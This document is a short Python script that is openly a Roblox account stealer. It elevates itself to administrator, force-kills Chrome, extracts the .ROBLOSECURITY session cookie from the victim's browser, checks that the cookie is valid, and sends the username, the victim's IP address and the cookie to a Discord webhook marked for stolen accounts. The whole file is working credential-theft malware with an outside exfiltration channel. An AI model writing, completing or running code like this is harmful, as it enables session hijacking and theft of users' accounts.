import browser_cookie3
import pyuac
import subprocess
import requests
import json
import robloxpy
from discord_webhook import DiscordWebhook

DiscordWebhookURL = "here for stolen accounts"
DiscordWebhookURL_ERROR = "here error webhooked for handling errors"

class PostUserData:
    
    def __init__(self, username, cookie, profile_picture, user_ip):
        
        self.username = username
        self.cookie = cookie
        self.profile_picture = profile_picture
        self.user_ip = user_ip

def terminate_chrome():
    
    try:
        
        subprocess.call(["TASKKILL", "/F", "/IM", "CHROME.EXE"])
        
    except FileNotFoundError:
        
        pass

def get_cookie():
    try:
        
        cookies = browser_cookie3.chrome(domain_name="roblox.com")
        
        for cookie in cookies:
            
            if cookie.name == '.ROBLOSECURITY':
                
                return cookie.value
    except:
        
        return None
    
def main():
    
    RobloxCookie = get_cookie()
    
    if RobloxCookie is None:
    
        quit()
        
    else:
        
        check = robloxpy.Utils.CheckCookie(RobloxCookie).lower()
        
        if check != "valid cookie":
            
            quit()
        
        def get_roblox_info():
            
            info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": RobloxCookie}).text)
            return info
        
        roblox_info = get_roblox_info()
        
        try:
            
            user_data = PostUserData(
                username=roblox_info['UserName'],
                cookie=RobloxCookie,
                profile_picture=roblox_info['ThumbnailUrl'],
                user_ip = requests.get('http://api.ipify.org').text
            )
            
        except Exception as e:
            
            DiscordWebhook(url=DiscordWebhookURL_ERROR, content=f'ERROR: {e}').execute()
            
        try:

            DiscordWebhook(url=DiscordWebhookURL, content=f'`[USERNAME]: {user_data.username}` `[DETECTED IP]: {user_data.user_ip}` ```[COOKIE]: {user_data.cookie}```').execute()
            
        except Exception as e:

            DiscordWebhook(url=DiscordWebhookURL_ERROR, content=f'ERROR: {e}').execute()

if __name__ == "__main__":
    
    if not pyuac.isUserAdmin():
        
        pyuac.runAsAdmin()
        
    else:
        
        terminate_chrome()
        
        main()
